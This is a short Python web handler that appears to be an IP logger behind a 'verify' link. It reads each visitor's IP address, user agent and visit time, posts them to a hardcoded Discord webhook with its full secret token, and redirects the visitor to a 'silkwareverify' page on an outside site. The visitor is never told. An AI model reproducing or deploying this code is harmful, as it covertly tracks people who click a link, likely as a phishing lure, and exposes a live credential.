import json
import requests
from datetime import datetime

def handler(request, response):
    try:
        # Grab visitor info
        ip = request.headers.get("x-forwarded-for", request.client.host)
        user_agent = request.headers.get("user-agent", "Unknown")
        time = datetime.utcnow().isoformat()

        # Build Discord message
        message = {
            "content": f"🟢 New visit:\n- IP: {ip}\n- User-Agent: {user_agent}\n- Time: {time}"
        }

        # Send to Discord webhook (hardcoded)
        webhook_url = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg"
        requests.post(webhook_url, data=json.dumps(message), headers={"Content-Type": "application/json"})

        # Redirect visitor
        response.status_code = 302
        response.headers["Location"] = "https://vaultcord.win/silkwareverify"
        return response

    except Exception as e:
        print("Error in /api/track:", e)
        response.status_code = 500
        return "Internal Server Error"
